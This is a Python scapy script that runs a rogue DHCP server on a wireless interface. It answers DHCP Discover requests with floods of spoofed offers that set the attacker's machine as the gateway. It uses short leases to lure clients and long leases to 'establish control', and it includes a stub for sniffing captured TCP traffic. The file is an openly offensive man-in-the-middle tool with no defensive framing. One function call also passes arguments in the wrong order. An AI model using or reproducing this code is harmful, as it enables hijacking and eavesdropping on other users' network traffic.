import random
import codecs
#from scapy.all import BOOTP, DHCP, Ether, IP, UDP, sendp, sniff, conf
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.sendrecv import sniff, sendp
from scapy.all import conf


# The malicious/decoy gateway IP (your machine's IP)
malicious_gateway_ip = "192.168.10.254"
fake_dhcp_server_ip = "192.168.10.254"  ## Setting to same in this case but can be separate
# Create a fake_ip_pool for wanted subnet that we want to offer
fake_ip_pool = iter([f"192.168.10.{i}" for i in range(50, 100)])

# Offer parameters
initial_lease_time = 30   # Short lease time in seconds
long_lease_time = 6000    # Longer lease time in seconds
short_offer_counter = 2     # Number of short offers before switching to long lease
offer_counter = 0         # Counter to track the number of offers sent

# Generate DHCP Offer in response to DHCP Discover
def send_dhcp_offer(packet, iface, hwaddr, bulk_offers=5, lease_time=6000):  ## Change the counts to the minimum possible to win the race
    for _ in range(bulk_offers):
      client_ip = next(fake_ip_pool)  # Allocate fake IP
      pkt = Ether(src=hwaddr, dst=packet[Ether].src)  ## Set source of our DHCP spoofer to our machines MACaddress
                                                    ## Set the destination to the MACaddress of the client asking for offer
      pkt /= IP(src=fake_dhcp_server_ip, dst="255.255.255.255")  # Your machine's IP, put offer on broadcast
      pkt /= UDP(sport=67, dport=68)  ## DHCP ports
      # Mark as DHCP offer, let client yield ip from fake_ip_pool, server identifier as our gateway, client hardware address
      pkt /= BOOTP(op=2, yiaddr=client_ip, siaddr=malicious_gateway_ip, chaddr=packet[BOOTP].chaddr)
      pkt /= DHCP(options=[
        ("message-type", "offer"),
        ("server_id", fake_dhcp_server_ip),
        ("router", malicious_gateway_ip),  # Your machine as the gateway
        ("lease_time", lease_time),  # Make sure to set this to a wanted value in seconds
                                     # Shorter to lure clients and longer to establish control
        ("subnet_mask", "255.255.255.0"),
        ("end"),
      ])
      sendp(pkt, iface=iface)
    print(f"Sent DHCP Offer to {packet[Ether].src} with IP {client_ip} and gateway {malicious_gateway_ip}")

# Handle DHCP Discover packets and respond with spoofed offers
def handle_dhcp_packet(packet, iface):
    global offer_counter
    if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
        hwaddr = packet[Ether].src

        # Check if we should use short or long lease time
        if offer_counter < short_offer_counter:
            lease_time = initial_lease_time
            offer_counter += 1
        else:
            lease_time = long_lease_time

        # Send the DHCP Offer with the selected lease time
        send_dhcp_offer(packet, iface, hwaddr, lease_time)

# Main function to start sniffing for DHCP Discover requests
def start_dhcp_spoof(iface):
    print(f"Starting DHCP spoofing on interface {iface}")
    sniff(filter="udp and (port 67 or 68)", iface=iface, prn=lambda pkt: handle_dhcp_packet(pkt, iface))

##
def send_dhcp_discover(iface, hwaddr):        ## Set this to your machine's MACaddress
    pkt = Ether(src=hwaddr, dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    pkt /= IP(src="0.0.0.0", dst="255.255.255.255")  # Broadcast IP
    pkt /= UDP(sport=68, dport=67)
    pkt /= BOOTP(op=1, xid=random.randint(0, 2 ** 32), chaddr=codecs.decode(hwaddr.replace(':', ''), 'hex'))
    pkt /= DHCP(options=[("message-type", "discover"), ("end")])
    sendp(pkt, iface=iface, count=10)  # Send 10 DHCP Discover packets
    print(f"Sent DHCP Discover from {hwaddr}")

## Have this sniffer here or in a separate script as module?
## For sniffing the traffic we might want to log
def packet_callback(packet):
    if IP in packet and TCP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        print(f"Captured packet from {src_ip} to {dst_ip}")

#sniff(iface="wlan0", prn=packet_callback, store=0)

# Example interface (adjust this to your network interface)
interface = "wlan0"
start_dhcp_spoof(interface)